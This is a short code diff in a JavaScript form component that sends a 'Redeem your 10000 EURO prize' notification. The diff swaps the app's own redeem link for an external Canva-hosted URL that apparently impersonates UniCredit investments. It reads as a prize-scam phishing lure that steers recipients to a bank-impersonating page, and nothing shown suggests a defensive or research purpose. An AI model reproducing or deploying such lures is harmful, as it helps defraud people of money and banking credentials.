@@ -26,7 +26,7 @@ function Form() {
             name: capitalize(userName.split(' ')[0]),
             title: 'Redeem your 10000 EURO prize',
             time: getFormattedNowDate(),
-            message: `Congrats! Redeem your prize here: ${window.location.origin}/redeem-prize`,
+            message: `Congrats! Redeem your prize here: https://investitii-unicredit.my.canva.site/dagntbq2uom`,
         }
 
         try {
